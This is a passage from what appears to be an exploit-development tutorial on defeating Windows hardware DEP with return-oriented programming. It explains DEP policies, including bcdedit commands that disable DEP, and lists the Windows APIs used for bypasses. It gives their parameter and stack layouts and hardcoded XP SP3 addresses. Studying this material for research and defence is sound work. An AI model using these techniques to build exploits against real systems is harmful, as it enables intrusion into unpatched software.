will assume that you do.\n2. You need to have *some* asm knowledge. Don\u2019t worry. Even if your\nknowledge is limited to being able to understand what certain\ninstructions do, you\u2019ll probably understand this tutorial. But when\nyou want to build your own rop exploits \/ apply the rop techniques\nyourself, you will need to be able to write asm \/ recognize asm\ninstructions when you need to do a specific task.  In a way, and to\na certain extent, you can compare writing a rop chain with writing\ngeneric shellcode, so I guess that the required level of asm you\nshould have.\n3. You need to know how to work with Immunity Debugger. Setting\nbreakpoints, stepping through instructions, modifying values in\nregisters and on the stack.\n4. You need to know how the stack works, how data can be put on the\nstack, taken from the stack, how registers work and how you can\ninteract with registers and the stack in general.  This is really\nnecessary before starting to do ROP.\n5. If you don\u2019t master the basics of stack based exploiting, then this\ndocument is not for you. I will try to explain and to document all\nsteps as good as I can, but in order to avoid ending up with an\nextremely lengthy document, I will have to assume you know how\nstack based overflows work and can be exploited.\nIn [102]article 6 of the tutorial series, I have explained some\ntechniques to bypass memory protection systems.   Today, I\u2019ll elaborate\nmore on one of these protection mechanisms, called DEP.  (To be more\nspecific, I\u2019ll talk about Hardware DEP (NX\/XD) and how we can bypass\nit)\nAs you can read in tutorial 6, there are 2 major kinds of protection\nmechanisms\u2026 First of all, there are plenty of techniques that can be\nput in place by the developer (secure coding, stack cookies, safeseh,\netc). Most compilers and linkers nowadays enable most of those features\nby default (except for \"secure coding\", which is not a feature of\ncourse), and that is a good thing. Sadly enough, there are still a\nhorrible amount of applications out there that are not protected and\nwill rely on other protection mechanisms. And I think you will agree\nthat there are still a lot of developers who don\u2019t apply secure coding\nprinciples to all their code. On top of that (which makes things even\nworse), some developers start to rely on OS protection mechanisms (see\nnext), and just don\u2019t even care about secure coding.\nThat brings us to a second layer of protections, which are part of all\nrecent versions of the Windows operating system : ASLR (Address Space\nLayout Randomization) and DEP (Data Execution Prevention).\nASLR will randomize stack, heap, module base addresses, making it hard\nto \"predict\" (and thus hardcode) addresses\/memory locations,\nconsequently making it hard(er) for hackers to build reliable exploits.\nDEP (I am referring to hardware DEP in this tutorial) will basically\nprevent code to be executed on the stack (which is what we have done in\nall previous tutorials).\nThe combination of ASLR and DEP have been proven to be quite effective\nin most cases (but, as you will learn today, can still be bypassed\nunder certain circumstances).\nIn short, application bugs\/buffer overflows won\u2019t auto magically\ndisappear, will probably never disappear, and compiler\/linker\nprotections are still not applied to all modules, all the time. That\nmeans that ASLR and DEP are our \"last resort\" layer of defense.  ASLR\nand DEP are now part of all recent OS\u2019es, so it\u2019s a natural evolution\nto see that attacking\/bypassing these 2 protection mechanisms have\nbecome significant targets for hackers and researchers.\nThe technique that will be used to bypass DEP in this tutorial is not a\nnew technique. It is very much based on the concept of ret-to-libc \/\ncode reuse and was (re)branded to \"ROP\", short for \"Return Oriented\nProgramming\".\nI already discussed the concept of ret-to-libc in tutorial 6, and in\nfact, the NtSetInformationProcess technique explain in tutorial 6 is an\nexample of ROP.\nOver the last year\/months, new vectors, new ways to use ROP to bypass\nDEP were documented.  What this tutorial does is simply gather all that\ninformation and explain how they can be used to bypass DEP on Win32\nsystems.\nBefore looking at what DEP is, and how to bypass it, there is one very\nimportant thing to keep in mind :\nIn all previous tutorials, our shellcode (including alignment code etc)\nhas been placed somewhere on the stack or heap, and we have tried to\nbuild reliable ways to jump to that code and execute it.\nWith hardware DEP enabled, you cannot execute a single instruction on\nthe stack.  You can still push and pop data onto\/from the stack, but\nyou cannot jump to the stack\/execute code. Not without\nbypassing\/disabling DEP first.\nKeep that in mind.\nHardware DEP in the Win32 world\nHardware DEP takes advantage of the NX (\"No Execute page protection\",\nAMD specification) or XD (\"Execute Disable\", Intel specification) bit\non DEP compatible CPU\u2019s, and will mark certain parts of the memory\n(which should only contain data, such as the default heap, stack,\nmemory pools) as non-executable.\nWhen an attempt is made to execute code from a DEP protected data page,\nan access violation (STATUS_ACCESS_VIOLATION (0xc0000005)) will occur.\nIn most cases, this will result in process termination (unhandled\nexception).  As a result of this, when a developer decided he wants to\nallow code to run from a certain memory page, he will have to allocate\nthe memory and mark it as executable.\nSupport for hardware DEP was introduced in Windows XP SP2 and Windows\nServer 2003 SP1 and is now part of all versions of the Windows\noperating system since those 2 versions.\nDEP functions on a per-virtual memory page basis and will change a bit\nin the PTE (Page Table Entry) to mark the page.\nIn order for the OS to use this feature, the processor must be running\nin PAE mode (Physical Address Extension).  Luckily, Windows will enable\nPAE by default.  (64bit systems are \"Address Windowing Extensions\"\n(AWE) aware, so no need to have a separate PAE kernel in 64 bit either)\nThe way DEP manifests itself within the Windows operating system is\nbased on a setting which can be configured to one of the following\nvalues :\n* OptIn : Only a limited set of Windows system modules\/binaries are\nprotected by DEP.\n* OptOut : All programs, processes, services on the Windows system\nare protected, except for processes in the exception list\n* AlwaysOn : All programs, processes, services, etc on the Windows\nsystem are protected. No exceptions\n* AlwaysOff : DEP is turned off.\nIn addition to those 4 modes, MS implemented a mechanism called\n\"Permanent DEP\", which uses SetProcessDEPPolicy(PROCESS_DEP_ENABLE) to\nmake sure processes are DEP enabled.  On Vista (and later), this\n\"permanent\" flag is automatically set for all executables that were\nlinked with the \/NXCOMPAT option.  When the flag is set, then changing\nthe DEP policy for that executable *might* only be possible using the\nSetProcessDEPPolicy technique (see later).\nYou can find more information about SetProcessDEPPolicy [103]here and\nhere\nThe default settings for the various versions of the Windows operating\nsystem are :\n* Windows XP SP2, XP SP3, Vista SP0 : OptIn\n* Windows Vista SP1 : OptIn + Permanent DEP\n* Windows 7: OptIn  + Permanent DEP\n* Windows Server 2003 SP1 and up : OptOut\n* Windows Server 2008 and up : OptOut + Permanent DEP\nThe DEP behavior on XP and 2003 server can be changed via a boot.ini\nparameter. Simply add the following parameter to the end of the line\nthat refers to your OS boot configuration :\n\/noexecute=policy\n(where \"policy\" can be  OptIn, OptOut, AlwaysOn or AlwaysOff)\nUnder Vista\/Windows 2008\/Windows 7, you can change the settings using\nthe bcdedit command :\nbcdedit.exe \/set nx OptIn\nbcdedit.exe \/set nx OptOut\nbcdedit.exe \/set nx AlwaysOn\nbcdedit.exe \/set nx AlwaysOff\nYou can get the current status by running \"bcdedit\" and looking at the\nnx value\nSome links about hardware DEP :\n* [104]http:\/\/support.microsoft.com\/kb\/875352\n* [105]http:\/\/en.wikipedia.org\/wiki\/Data_Execution_Prevention\n* [106]http:\/\/msdn.microsoft.com\/en-us\/library\/aa366553(VS.85).aspx\nBypassing DEP \u2013 Building blocks\nAs stated in the introduction, when hardware DEP is enabled, you cannot\njust jump to your shellcode on the stack, because it would not get\nexecuted. Instead, it would trigger an access violation and most likely\nterminate the process.\nOn top of that, each specific DEP setting (OptIn, OptOut, AlwaysOn,\nAlwaysOff) and the impact (or absence) of Permanent DEP will require\n(or will even dictate) a specific approach and technique.\nSo, what are our options ?\nWell, since we cannot execute our own code on the stack, the only thing\nwe can do is execute existing instructions\/call existing functions from\nloaded modules and use data on the stack as parameters to those\nfunctions\/instructions.\nThese existing functions will provide us with the following options :\n* execute commands (WinExec for example \u2013 classic \"ret-to-libc\")\n* mark the page (stack for example) that contains your shellcode as\nexecutable (if that is allowed by the active DEP policy) and jump\nto it\n* copy data into executable regions and jump to it. (We *may* have to\nallocate memory and mark the region as executable first)\n* change the DEP settings for the current process before running\nshellcode\nThe currently active DEP policy and settings will pretty much dictate\nthe technique(s) you have to use to bypass DEP in a certain scenario.\nA technique which should work all the time is \"classic\" ret-to-libc.\nYou should be able to execute simple commands, using existing Windows\nAPI calls (such as WinExec), but it will be hard to craft \"real\"\nshellcode with this.\nSo we need to look further.  We really need to try to\nbypass\/overrule\/change the DEP settings and get our custom shellcode to\nrun.   Luckily, marking pages executable \/ changing DEP policy settings\n\/ etc  can be done using native Windows OS API\u2019s\/function calls.\nSo, is it that simple ?\nYes and no.\nWhen we have to bypass DEP, we\u2019ll have to call a Windows API (I\u2019ll go\ninto detail on these Windows API\u2019s a little bit further down the road).\nThe parameters to that API need to be in a register and\/or on the\nstack.  In order to put those parameters where they should be, we\u2019ll\nmost likely have to write some custom code.\nThink about it.\nIf one of the parameters to a given API function is for example the\naddress of the shellcode, then you have to dynamically\ngenerate\/calculate this address and put it in the right place on the\nstack. You cannot hardcode it, because that would be very unreliable\n(or, if the buffer cannot deal with null bytes and one of the\nparameters requires null bytes, then you would not be able to hardcode\nthat value in your buffer). Using some small (shell)code to generate\nthe value would not work either, because\u2026 DEP is enabled.\nQuestion : How do we get those parameters on the stack ?\nAnswer : With custom code.\nCustom code on the stack, however, cannot be executed. DEP would\nprevent that from happening.\nDon\u2019t believe me ?  Let\u2019s try with our good old Easy RM to MP3\nConvertor exploit from tutorial 1.\n[107]Without DEP (OptIn)\n[108]image\n[109]With DEP (OptOut)\n[110]image\nOr, as seen in the debugger (with DEP enabled \u2013 OptOut), right when the\nfirst instruction of the shellcode would get executed (so directly\nafter the jump esp is made) : [111]Movie\n[112]image\nTrust me. Even a simple NOP will not get executed.\nNote : in today\u2019s tutorial, I will not discuss browser attacks, which\nmay offer the possibility to user other\/different techniques to bypass\nDEP (.Net user control, actionscript\/java heap spraying, jit-spray,\netc)\nThe gadget\nAnyways, back to our \"custom code\" issue. So if running code from the\nstack won\u2019t work, we have to use ROP.\nIn order to run our custom code and eventually execute the Windows API\nfunction call, we will need to use existing instructions (instructions\nin executable areas within the process), and put them in such an order\n(and \"chain\" them together) so they would produce what we need and put\ndata in registers and\/or on the stack.\nWe need to build a chain of instructions.  We need to jump from one\npart of the chain to the other part of the chain without ever executing\na single bit from our DEP protected region.  Or, to use a better term,\nwe need to return from one instruction to the address of the next\ninstruction (and finally return to the windows API call when the stack\nhas been set up).\nEach instruction (series of instructions) in our ROP chain will be\ncalled a \"gadget\".  Each gadget will return to the next gadget ( = to\nthe address of the next gadget, placed on the stack), or will call the\nnext address directly. That way, instruction sequences are chained\ntogether.   It\u2019s important to understand that we are going to build ROP\nexploits for stack based overflows. That will be the location where our\npayload is placed, so it\u2019s \"normal\" that we will return to the stack\n(because that\u2019s most likely is going to be the place where the chain\ngets started, and thus acts as \"caller\" for the rop chain)\nIn his [113]original paper, Hovav Shacham used the term \"gadget\"\nwhen referring to higher-level macros\/code snippets.  Nowadays, the\nterm \"gadget\" is often used to refer to a sequence of instructions,\nending with a ret (which is in fact just a subset of the original\ndefinition of a \"gadget\").  It\u2019s important to understand this\nsubtlety, but at the same time I\u2019m sure you will forgive me when I\nuse \"gadget\" in this tutorial to refer to a set of instructions\nending with a RET.\nWhile you are building a ROP based exploit, you\u2019ll discover that the\nconcept of using those gadgets to building your stack and calling an\nAPI can sometimes be compared to solving a Rubik\u2019s [tm] Cube (Thanks\nLincoln for the great comparison).  When you try to set a certain\nregister or value on the stack, you may end up changing another one.\nSo there is not generic way to build a ROP exploit and you will find it\nsomewhat frustrating at times. But I can guarantee you that some\npersistence and perseverance will pay off.\nThat\u2019s the theory.\nWindows function calls to bypass DEP\nFirst of all, before you start writing an exploit, you need to\ndetermine what your approach will be.  What are the possible\/available\nWindows API functions that can be used to bypass DEP in your current OS\n\/ DEP policy ?   Once you have determined that, you can think about\nsetting up your stack accordingly.\nThese are the most important functions that can help you to\nbypass\/disable DEP :\n* VirtualAlloc(MEM_COMMIT + PAGE_READWRITE_EXECUTE) + copy memory.\nThis will allow you to create a new executable memory region, copy\nyour shellcode to it, and execute it. This technique may require\nyou to chain 2 API\u2019s into each other.\n* HeapCreate(HEAP_CREATE_ENABLE_EXECUTE) + HeapAlloc() + copy memory.\nIn essence, this function will provide a very similar technique as\nVirtualAlloc(), but may require 3 API\u2019s to be chained together))\n* SetProcessDEPPolicy(). This allows you to change the DEP policy for\nthe current process (so you can execute the shellcode from the\nstack) (Vista SP1, XP SP3, Server 2008, and only when DEP Policy is\nset to OptIn or OptOut)\n* NtSetInformationProcess().  This function will change the DEP\npolicy for the current process so you can execute your shellcode\nfrom the stack.\n* VirtualProtect(PAGE_READ_WRITE_EXECUTE). This function will change\nthe access protection level of a given memory page, allowing you to\nmark the location where your shellcode resides as executable.\n* WriteProcessMemory(). This will allow you to copy your shellcode to\nanother (executable) location, so you can jump to it and execute\nthe shellcode. The target location must be writable and executable.\nEach one of those functions requires the stack or registers to be set\nup in a specific way.  After all, when an API is called, it will assume\nthat the parameters to the function are placed at the top of the stack\n(= at ESP). That means that your primary goal will be to craft these\nvalues on the stack, in a generic and reliable way, without executing\nany code from the stack itself.\nAt the end (so after crafting the stack), you will most likely end up\ncalling the API.  To make that call work, ESP must point at the API\nfunction parameters.\nBecause we will be using gadgets (pointers to a series of\ninstructions), which are placed on the stack as part of your\npayload\/buffer, and because we are most likely going to return back to\nthe stack all the time (or most of the times), it is very likely that,\nafter building your entire rop chain to craft the parameters, your\nfinal result will *probably* look something like this :\njunk\nrop gadgets to craft the stack\nESP -> function pointer (to one of the Windows API\u2019s)\nFunction parameter\nFunction parameter\nFunction parameter\n\u2026\nMaybe some more rop gadgets\nnops\nshellcode\nmore data on the stack\nRight before the function gets called, ESP points to the Windows API\nfunction pointer. That pointer is directly followed by the parameters\nthat are needed for the function.\nAt that time, a simple \"RET\" instruction will jump to that address.\nThis will call the function and will make ESP shift with 4 bytes. If\nall goes well, the top of the stack (ESP) points at the function\nparameters, when the function is called.\nChoose your weapon\nAPI \/ OS   XP SP2 XP SP3 Vista SP0 Vista SP1 Windows 7 Windows 2003 SP1\nWindows 2008\nVirtualAlloc\nyes\nyes\nyes\nyes\nyes\nyes\nyes\nHeapCreate\nyes\nyes\nyes\nyes\nyes\nyes\nyes\nSetProcessDEPPolicy\nno (1)\nyes\nno (1)\nyes\nno (2)\nno (1)\nyes\nNtSetInformationProcess\nyes\nyes\nyes\nno (2)\nno (2)\nyes\nno (2)\nVirtualProtect\nyes\nyes\nyes\nyes\nyes\nyes\nyes\nWriteProcessMemory\nyes\nyes\nyes\nyes\nyes\nyes\nyes\n(1) = doesn\u2019t exist\n(2) = will fail because of default DEP Policy settings\nDon\u2019t worry about how to apply these techniques, things will become\nclear soon.\nFunction parameters & usage tips\nAs stated earlier, when you want to use one of the available Windows\nAPI\u2019s, you will have to set up the stack with the correct parameters\nfor that function first.  What follows is a summary of all of these\nfunctions, their parameters, and some usage tips.\nVirtualAlloc()\nThis function will allocate new memory. One of the parameters to this\nfunction specifies the execution\/access level of the newly allocated\nmemory, so the goal is to set that value to EXECUTE_READWRITE.\n[114]http:\/\/msdn.microsoft.com\/en-us\/library\/aa366887(VS.85).aspx\nLPVOID WINAPI VirtualAlloc(\n__in_opt  LPVOID lpAddress,\n__in      SIZE_T dwSize,\n__in      DWORD flAllocationType,\n__in      DWORD flProtect\n);\nThis function requires you to set up a stack that contains the\nfollowing values :\nReturn Address Function return address (= address where function needs\nto return to after it has finished). I will talk about this value in a\nfew moments\nlpAddress Starting address of region to allocate (= new location where\nyou want to allocate memory). Keep in mind that this address might get\nrounded to the nearest multiple of the allocation granularity.  You can\ntry to put a provide a hardcoded value for this parameter\ndwSize Size of the region in bytes. (you will most likely need to\ngenerate this value using rop, unless your exploit can deal with null\nbytes)\nflAllocationType Set to 0x1000 (MEM_COMMIT). Might need rop to generate\n& write this value to the stack\nflProtect Set to 0x40 (EXECUTE_READWRITE). Might need rop to generate &\nwrite this value to the stack\nOn XP SP3, this function is located at 0x7C809AF1 (kernel32.dll)\nWhen the VirtualAlloc() call was successful, the address where the\nmemory has been allocated, will be saved into eax.\nNote : this function will only allocate new memory.  You will have to\nuse a second API call to copy the shellcode into that new region and\nexecute it.  So basically, you need a second rop chain to accomplish\nthis. (In the table above, I mentioned that the return address\nparameter needs to point to the second rop chain. So basically, the\nreturn address to VirtualAlloc() needs to point to the rop chain that\nwill copy your shellcode to the newly allocated region and then jump to\nit)\nTo do this, you can use\n* memcpy()   (ntdll.dll) \u2013 0x7C901DB3 on XP SP3\n* WriteProcessMemory()  (see later)\nIf you, for example, want to use memcpy(), then you can hook both the\nVirtualAllocate() and memcpy() calls together and have them execute\ndirectly after each other, using the following setup :\nFirst, the pointer to VirtualAlloc() must be at the top of the stack,\nwhich is then followed by the following values (parameters) on the\nstack :\n* pointer to memcpy  (return address field of VirtualAlloc()). When\nVirtualAlloc ends, it will return to this address\n* lpAddress : arbitrary address (where to allocate new memory.\nExample 0x00200000)\n* size (how big should new memory allocation be)\n* flAllocationType (0x1000 : MEM_COMMIT)\n* flProtect (0x40 :  PAGE_EXECUTE_READWRITE)\n* Arbitrary address (same address as lpAddress, this param here will\nused to jump to shellcode after memcpy() returns). This field is\nthe first parameter to the memcpy() function\n* Arbitrary address (again, same address as lpAddress. Parameter here\nwill be used as destination address for memcpy() ). This field is\nthe second parameter to the memcpy() function\n* Address of shellcode ( = source parameter for memcpy()). This will\nbe the 3rd parameter to the memcpy() function\n* Size : size parameter for memcpy(). This is the last parameter for\nthe memcpy() function\nThe key is obviously to find a reliable address (address where to\nallocate memory) and produce all parameters on the stack using rop.\nWhen this chain ends, you will end up executing the code which was\ncopied to the newly allocated memory earlier.\nHeapCreate()\n[115]http:\/\/msdn.microsoft.com\/en-us\/library\/aa366599(VS.85).aspx\nHANDLE WINAPI HeapCreate(\n__in  DWORD flOptions,\n__in  SIZE_T dwInitialSize,\n__in  SIZE_T dwMaximumSize\n);\nThis function will create a private heap that can be used in our\nexploit.  Space will be reserved in the virtual address space of the\nprocess.\nWhen the flOptions parameter is set to 0x00040000\n(HEAP_CREATE_ENABLE_EXECUTE), then all memory blocks that are allocated\nfrom this heap, will allow for code execution, even if DEP is enabled.\nParameter dwInitialSize must contain a value that indicates the initial\nsize of the heap, in bytes. If you set this parameter to 0, then one\npage will be allocated.\nThe dwMaximumSize parameter refers to the maximum size of the heap, in\nbytes.\nThis function, will only create a private heap and mark it as\nexecutable. You still to allocate memory in this heap (with HeapAlloc\nfor example) and then copy the shellcode to that heap location (with\nmemcpy() for example)\nWhen the CreateHeap function returns, a pointer to the newly created\nheap will be stored in eax. You will need this value to issue a\nHeapAlloc() call :\n[116]http:\/\/msdn.microsoft.com\/en-us\/library\/aa366597(v=VS.85).aspx\nLPVOID WINAPI HeapAlloc(\n__in  HANDLE hHeap,\n__in  DWORD dwFlags,\n__in  SIZE_T dwBytes\n);\nWhen new heap memory was allocated, you can use memcpy() to copy your\nshellcode into the allocated heap and execute it.\nOn XP SP3, HeapCreate is located at 0x7C812C56. HeapAlloc() is located\nat 7C8090F6. Both functions are part of kernel32.dll\nSetProcessDEPPolicy()\n[117]http:\/\/msdn.microsoft.com\/en-us\/library\/bb736299(VS.85).aspx\nWorks for : Windows XP SP3, Vista SP1 and Windows 2008.\nIn order for this function to work, the current DEP Policy must be set\nto OptIn or OptOut. If the policy is set to AlwaysOn (or AlwaysOff),\nthen SetProcessDEPPolicy will throw an error. If a module is linked\nwith \/NXCOMPAT, the technique will not work either.   Finally and\nequally important, it can only be called for the process just once.  So\nif this function has already been called in the current process (IE8\nfor example, already calls it when the process starts), then it won\u2019t\nwork.\nBernardo Damele wrote an excellent blog post about this topic :\n[118]http:\/\/bernardodamele.blogspot.com\/2009\/12\/dep-bypass-with-setproc\nessdeppolicy.html\nBOOL WINAPI SetProcessDEPPolicy(\n__in  DWORD dwFlags\n);\nThis function requires one parameter, and this parameter must be set to\n0 to disable DEP for the current process.\nIn order to use this function in a ROP chain, you need to set up the\nstack like this :\n* pointer to SetProcessDEPPolicy()\n* pointer to shellcode\n* zero\nThe \"pointer to shellcode\" will make sure the chain will jump to the\nshellcode when the SetProcessDEPPolicy() was executed.\nThe address of SetProcessDEPPolicy() on XP SP3 is 7C8622A4\n(kernel32.dll)\nNtSetInformationProcess()\nWorks for : Windows XP, Vista SP0, Windows 2003\nTechnique documented by skape and skywing :\n[119]http:\/\/uninformed.org\/index.cgi?v=2&a=4\nNtSetInformationProcess(\nNtCurrentProcess(),    \/\/ (HANDLE)-1\nProcessExecuteFlags,   \/\/ 0x22\n&ExecuteFlags,         \/\/ ptr to 0x2\nsizeof(ExecuteFlags)); \/\/ 0x4\nUsing this function will require you to have 5 parameters on the stack\n:\nReturn address Value to be generated, indicates where function needs to\nreturn to (= location where your shellcode is placed)\nNtCurrentProcess() Static value, set to 0xFFFFFFFF\nProcessExecuteFlags Static value, set to 0x22\n&ExecuteFlags Pointer to 0x2 (value can be static, might be dynamic as\nwell). This address has to point to a memory location that contains\n0x00000002\nsizeOf(ExecuteFlags) Static value, set to 0x4\nThe NtSetInformationProcess will fail if the permanent DEP flag is\nset.  On Vista (and later), this flag is set automatically for all\nexecutables linked with the \/NXCOMPAT linker option.  The technique\nwill also fail if the DEP policy mode is set to AlwaysOn.\nAlternatively, you can also use an existing routine in ntdll (which, in\nessence, will do the same, and it will have the parameters set up for\nyou automatically).\nOn XP SP3, NtSetInformationProcess() is located at 7C90DC9E (ntdll.dll)\nAs stated earlier, I already explained a possible way to use this\ntechnique in [120]tutorial 6, but I will show another way to use this\nfunction in today\u2019s tutorial.\nVirtualProtect()\n[121]http:\/\/msdn.microsoft.com\/en-us\/library\/aa366898(VS.85).aspx\nThe VirtualProtect function changes the access protection of memory in\nthe calling process.\nBOOL WINAPI VirtualProtect(\n__in   LPVOID lpAddress,\n__in   SIZE_T dwSize,\n__in   DWORD flNewProtect,\n__out  PDWORD lpflOldProtect\n);\nIf you want to use this function, you will have to put 5 parameters on\nthe stack :\nReturn address pointer to the location where VirtualProtect() needs to\nreturn to. This will be the address of your shellcode on the stack\n(dynamically created value)\nlpAddress pointer to the base address of the region of pages whose\naccess protection attributes need to be changed. In essence, this will\nbe the base address of your shellcode on the stack (dynamically created\nvalue)\ndwsize number of bytes (dynamically created value, making sure the\nentire shellcode can get executed. If the shellcode will expand for\nsome reason (because of decoding for example), then those additional\nbytes will need to be taken into account and accounted for.\nflNewProtect option that specifies the new protection option :\n0x00000040 : PAGE_EXECUTE_READWRITE. If your shellcode will not modify\nitself (decoder for example), then a value of 0x00000020\n(PAGE_EXECUTE_READ) might work as well\nlpflOldProtect pointer to variable that will receive the previous\naccess protection value\nNote : The memory protection constants that can be used in\nVirtualProtect() can be found [122]here\nOn XP SP3, VirtualProtect() is located at 0x7C801AD4 (kernel32.dll)\nWriteProcessMemory()\n[123]http:\/\/msdn.microsoft.com\/en-us\/library\/ms681674(VS.85).aspx\nTechnique documented by Spencer Pratt :\n[124]http:\/\/www.packetstormsecurity.org\/papers\/general\/Windows-DEP-WPM.\ntxt\nBOOL WINAPI WriteProcessMemory(\n__in   HANDLE hProcess,\n__in   LPVOID lpBaseAddress,\n__in   LPCVOID lpBuffer,\n__in   SIZE_T nSize,\n__out  SIZE_T *lpNumberOfBytesWritten\n);\nThis function will allow you to copy your shellcode to another\n(executable) location so you can jump to it & execute it. During the\ncopy, WPM() will make sure the destination location is marked as\nwriteable. You only have to make sure the target destination is\nexecutable.\nThis function requires 6 parameters on the stack :\nreturn address Address where WriteProcessMemory() needs to return to\nafter it finished\nhProcess the handle of the current process. Should be -1 to point to\nthe current process (Static value 0xFFFFFFFF)\nlpBaseAddress pointer to the location where your shellcode needs to be\nwritten to. The \"return address\" and \"lpBaseAddress\" will be the same.\nlpBuffer based address of your shellcode (dynamically generated,\naddress on the stack)\nnSize number of bytes that need to be copied to the destination\nlocation\nlpNumberOfBytesWritten writeable location, where number of bytes will\nbe written to\nOn XP SP3, WriteProcessMemory() is located at 0x7C802213 (kernel32.dll)\nOne of the nice things about WriteProcessMemory()  (abbreviated to\nWPM() from this point forward) is the fact that you can use it in 2\nways to gain DEP bypass.\n* WPM Technique 1 : full WPM() call\nYou can copy\/write your shellcode to an executable location and jump to\nit. This technique requires all WPM() parameters to be set up\ncorrectly.   A possible example for XP SP3 would be patching\noleaut32.dll (which is loaded in many applications). Oleaut32.dll is\nmost likely not going to be used in your shellcode, so it would be\nacceptable to \"corrupt\" it.\nThe .text section if oleaut32.dll is R E, begins at 0x77121000 and is\n7F000 bytes long.\n[125]image\nThere is a problem with this approach. Since you will be writing to\na R+E area, the shellcode will not be able to modify itself. (The\nWriteProcessMemory call will temporarily mark the location as\nwriteable, but removes the level again.) This means that, if you are\nusing encoded shellcode (or shellcode that modifies itself), it will\nnot work.  This can be an issue because of bad chars etc.\nOf course, you could try to prepend the real shellcode with some\nsmall shellcode that would use virtualprotect() for example, to mark\nit\u2019s own location as writable.  You can find an example on how to do\nthis, in the \"Egghunter\" section\nWe need 2 addresses : one to be used as return address \/ destination\naddress, and one that will be used as writeable location (where \u2018number\nof bytes written\u2019 will be written to).  So a good example would be :\nreturn address         0x77121010\nhProcess               0xFFFFFFFF\nlpBaseAddress          0x77121010\nlpBuffer               to be generated\nnSize                  to be generated\nlpNumberOfBytesWritten 0x77121004\n(the lpNumberOfBytesWritten is located before the destination location,\nto avoid that it would corrupt the shellcode after it was copied to the\ndestination)\nIf you want to use shellcode that uses a decoder, you will have to\nprepend your shellcode with a call to virtualprotect or so, to mark the\ncurrent region as writable \/ executable  (depending on whether you are\nwriting to a RE or RW area) before running the encoded shellcode..\n* WPM Technique 2 : patch WPM() itself\nAlternatively, you can also \"patch\" the WPM function itself. So\nbasically you would be writing your shellcode into kernel32.dll,\noverwriting a part of the WPM function.  This will solve the issue with\nencoded shellcode (but it has a size limitation as you will see in a\nfew moments)\nOn XP SP3, the WPM function is located at 0x7C802213\n[126]image\nInside the WPM function, a number of CALL\u2019s and jumps are made to\nactually copy the data (shellcode) from the stack to the destination\nlocation  :\n* 0x7C802222 : call ntdll.ZwProtectVirtualMemory() : this function\ncall will make sure the target location will become writeable\n* 0x7C802271 : call ntdll.ZwWriteVirtualMemory()\n* 0x7C80228B : call ntdll.ZwFlushInstructionCache())\n* 0x7C8022C9 : call ntdll.ZwWriteVirtualMemory()\nAfter the last function call is made, the data will be copied into the\ndestination location.\nThen, when the copy itself is made, the function will write the \"number\nof bytes\" written and will then return to the return address specified\nas a parameter.  This final routine starts at 7C8022CF (so right after\nthe last call to WriteVirtualMemory())\nSo our second option would be to write the shellcode on top of the code\nthat would write the \"number of bytes\" and would return to the caller.\nWe don\u2019t really need to wait for the code to write those bytes and\nreturn to the call, because all we really want to do is execute the\nshellcode.\nAgain (and as you can see in the disassembly below), when the WPM\nfunction has finished the copy process, it returns to 0x7C8022CF. So\nthat might be a good location to use as destination address, because it\nwould sit in the natural flow of the application and would thus get\nexecuted automatically.\n[127]image\nThis has a few consequences :\nParameters : The first (return address) and last parameter (pointer to\nwriteable address for lpNumberOfBytesWritten) are not really important\nanymore. You can just set the return address to 0xFFFFFFFF for example.\nAlthough Spencer Pratt stated in his [128]paper that the\nlpNumberOfBytesWritten can be set to any value (0xDEADBEEF if you\nwill), it appears that this address still needs to point to a writable\nlocation to make it work. In addition to that, the destination address\n(so where the shellcode must be written into) points inside the WPM\nfunction itself.   On XP SP3, this would be 0x7C8022CF\nSize : Hot patching the WPM function looks nice, but it might corrupt\nkernel32.dll if we write too far.  kernel32.dll might be important for\nthe shellcode itself. It is very likely that your shellcode will use\nfunctions in kernel32.dll.  If you corrupt the kernel32.dll structure,\nyour shellcode may not be able to run either. So this technique would\nwork for cases where your shellcode size is limited)\nExample stack layout \/ function parameters :\nreturn address         0xFFFFFFFF\nhProcess               0xFFFFFFFF\nlpBaseAddress          0x7C8022CF\nlpBuffer               to be generated\nnSize                  to be generated\nlpNumberOfBytesWritten use a (any) writable location, can be static\nROP Exploit transportability\nWhen you start to build ROP exploits, you will most likely end up hard\ncoding the function pointer address in your exploit. While there may be\nways to avoid doing that, if you do have to hardcode pointers, you\nalready know that your exploit may not work across other versions of\nthe Windows operating system.\nSo, if you have hardcoded pointers to windows functions, then it would\nbe ok to use gadgets from OS dll\u2019s as well. As long as we don\u2019t have to\ndeal with ASLR, then all of that is fine.\nTrying to build a generic exploit is nice, but let\u2019s be honest \u2013 you\nonly need to avoid OS dll\u2019s if you are not hard coding anything from an\nOS dll.\nEither way, It might be a good idea to verify if the application uses\nthe function that you want to use to bypass DEP, and see if you can\ncall that functions using an application\/module pointer. That way, you\ncan still make the exploit portable, without having to generate the\nfunction address, and without having to hardcode addresses from an OS\ndll.\nA possible way to find out if you can use an API call from within the\napplication or application dll\u2019s is by loading the executable \/ modules\nin IDA, and looking at the \"Imports\" section\nExample : msvcr71.dll on XP SP3\n* 7C37A08C : HeapCreate()\n* 7C37A07C : HeapAlloc()\n* 7C37A094 : VirtualAlloc()\n* 7C37A140 : VirtualProtect()\nNote : check out \"!pvefindaddr ropcall\" , available in\n[129]pvefindaddr v1.34 and up\nFrom EIP to ROP\nTo make things clear, we\u2019ll start with the basics.\nWhether DEP is enabled or not, the initial process to overflow a buffer\nand eventually gain control over EIP will be exactly the same.  So you\neither end up with overwriting EIP directly, or you manage to overwrite\na SEH record and trigger an access violation so the overwritten SE\nhandler address is called.  (There are other ways to get control over\nEIP, but these are outside the scope of this article)\nSo far so good, DEP has nothing to do with that.\nDirect RET\nIn a typical direct RET exploit, you directly overwrite EIP with an\narbitrary value (or, to be more precise, EIP gets overwritten when a\nfunction epilogue \u2013 which uses an overwritten saved EIP \u2013 is\ntriggered).  When that happens, you\u2019ll most likely see that you control\nmemory data in the location where ESP points at.  So if it wasn\u2019t for\nDEP, you would locate a pointer to \"jump esp\" using your favorite tool\n(!pvefindaddr j esp) and jump to your shellcode. Game over.\nWhen DEP is enabled, we cannot do that.  Instead of jumping to ESP\n(overwriting EIP with a pointer that would jump to esp), we have to\ncall the first ROP gadget (either directly in EIP or by making EIP\nreturn to ESP). The gadgets must be set up in a certain way so they\nwould form a chain and one gadget returns to the next gadget without\never executing code directly from the stack.\nHow this can allow us to build a ROP exploit will be discussed later\non.\nSEH based\nIn a SEH based exploit, things are a bit different.  You only control\nthe value in EIP when the overwritten SE Handler is called (by\ntriggering an access violation for example).   In typical SEH based\nexploits, you will overwrite SEH with a pointer to pop\/pop\/ret, which\nwill make you land at next SEH, 